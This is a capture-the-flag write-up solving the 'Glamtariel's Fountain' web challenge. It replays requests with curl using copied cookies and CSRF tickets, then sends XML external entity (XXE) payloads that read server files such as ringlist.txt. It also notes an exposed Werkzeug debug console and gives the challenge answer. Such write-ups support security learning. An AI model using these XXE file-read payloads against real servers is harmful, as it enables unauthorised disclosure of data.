# Glamtariel's Fountain

**Difficulty**: :fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star::fontawesome-regular-star:<br/>
**Direct link**: [fountain website](https://glamtarielsfountain.com/)

## Objective

!!! question "Request"
    Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.

??? quote "Akbowl"
    Huh - what? Why do you disturb Akbowl?<br/>
    I'm trying to get the ring in here for the Sporc Chief.<br/>
    Unlucky for me it's lost in this water basin thing.<br/>
    You will not get it out before Akbowl!


## Hints

??? hint "Significant CASE"
    Early parts of this challenge can be solved by focusing on Glamtariel's WORDS.

??? hint "eXternal Entities"
    Sometimes we can hit web pages with XXE when they aren't expecting it!


## Solution

The first hint talks about using the capitalized words in the messages to solve part of the challenge:

1. I don't know why anyone would ever ask me to TAMPER with the cookie recipe.
2. Kringle really dislikes it if anyone tries to TAMPER with the cookie recipe Glamtariel uses
3. I helped the elves to create the PATH here to make sure that only those invited can find their way here
4. The elves do a great job making PATHs which are easy to follow once you see them.
5. Did you know that I speak in many TYPEs of languages?
6. Fake tickets to get in here? Snacks that don't taste right? How could that be?
7. Careful with the fountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed!
8. Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPointed
9. I like to keep track of all my rings using a simple format, although I usually don't like to discuss such things.
10. I know I've heard through the ice cracks that Kringle is missing a special one. (i.e., special ring)
11. Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file.
12. I've heard Glamtariel talk in her sleep about rings using a different TYPE of language. She may be more responsive about them if you ask differently.

Putting the hints together, including the one we got from solving the Boria Door bonus levels, and information obtained by capturing data passing to and from our web browser from talking to the princess and the fountain, we find:
1. Image resouces are hosted at /static/images/ (i.e. /static/images/img3-1670608613565.png)
2. XXE in combination with the TYPE hints indicates we can probably also talk to the princess using XML
3. Talking to the princess and the fountain happens via POST to https://glamtarielsfountain.com/dropped
4. POST requests send 3 values: `imgDrop` (the image HTML ID), `who` (entity we're talking to), `reqtype` (json or xml)
5. Requests need to include a valid CSRF token (i.e., ticket) and cookies

Testing this out using cURL we can build the following request using cookies and ticket details copied from our web browser:
```shell
curl -X POST https://glamtarielsfountain.com/dropped \
-H "Content-Type: application/json" \
-H "Accept: application/json" \
-H $GRINCHUM \
-H $COOKIE \
-d '{"imgDrop":"img1","who":"princess","reqType":"json"}'
```

Messages on the websites are triggered via images names img1, img2, img3, and img4. After a while they are replaced with a new set, but the names remain the same. So we can just keep sending cURL requests with updated values for `imgDrop` and `who`. After some time we will hit the part where the eye appears in the UI. In the CLI this presents itself with a response that has the `visit` field set to an image resource.

```
{'appResp': "Careful with the fountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed!^Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPointed. Please click away that ominous eye!", 'droppedOn': 'fountain', 'visit': 'static/images/stage2ring-eyecu_2022.png,260px,90px'}
```

These images can be downloaded, but only if you ensure the ticket and cookie information is present in the request. Once we have gone through all iterations (i.e., the princess and fountain have nothing more to say about the items), we can switch to sending XML requests to the princess.

```shell
curl -X POST https://glamtarielsfountain.com/dropped \
-H "Content-Type: application/xml" \
-H "Accept: application/json" \
-H $GRINCHUM \
-H $COOKIE \
-d @req.xml
```

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<root>
<imgDrop>goldring</imgDrop>
<who>princess</who>
<reqType>xml</reqType>
</root>
```

This is where the XXE exploitation comes into play and we need to use the hints provided about PATH, APP, RINGLIST, and the simple file format of the ring list. Putting those together gives us the `/app/static/images/ringlist.txt` path. We can use techniques described at https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files to leverage XXE to make the server read the contents of that file. So let's modify our XML request data.

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt" >]>
<root>
<imgDrop>&xxe;</imgDrop>
<who>princess</who>
<reqType>xml</reqType>
</root>
```

Similar to the response we received when the eye appeared, this will also send a response back that contains a `visit` field that points to an image file which we can download, making sure to include our ticket and cookie.

```
{'appResp': "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)", 'droppedOn': 'none', 'visit': 'static/images/pholder-morethantopsupersecret63842.png,262px,100px'}
```

pholder-morethantopsupersecret63842.png gives us `x_phial_pholder_2022` with `bluering`, `redring.txt`. There's alo a reference to a gold, red, and blue ring, and from the messages we already know the princess likes silver rings as well. So we use this information to define additional paths to access files from.

- /app/static/images/x_phial_pholder_2022/bluering.txt
- /app/static/images/x_phial_pholder_2022/redring.txt
- /app/static/images/x_phial_pholder_2022/goldring.txt
- /app/static/images/x_phial_pholder_2022/silverring.txt
- /app/static/images/x_phial_pholder_2022/greenring.txt

`silverring.txt` and `greenring.txt` again yield a `visit` field with an image resource in the response. The redring-supersupersecret928164.png image file has an inscription that says "goldring_to_be_deleted.txt". So we use XXE once more with `/app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt`.

```
{'appResp': "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.", 'droppedOn': 'none', 'visit': 'none'}
```

We need to use the `imgDrop` field again to hand over the right ring, so we need to move the XXE to another field for this to work. We need the XXE because we want to trigger the secret behavior like before, but we also need the `imgDrop` field to get the proper image across.

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
<root>
<imgDrop>img1</imgDrop>
<who>princess</who>
<reqType>&xxe;</reqType>
</root>
```

```
{'appResp': "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!", 'droppedOn': 'none', 'visit': 'static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px'}
```

Useful:
- HTTP response headers: Werkzeug/2.2.2 Python/3.10.8
- There is a werkzeug console at: https://glamtarielsfountain.com/console

!!! done "Answer"
    `goldring-morethansupertopsecret76394734.png`


### Response

!!! quote "Akbowl"
    No! That's not yours!<br/>
    This birdbath showed me images of this happening.<br/>
    But I didn't believe it because nobody is better than Akbowl!<br/>
    Akbowl's head is the hardest! That's what the other sporcs tell me.<br/>
    I guess Akbowl's head is not the smartest.
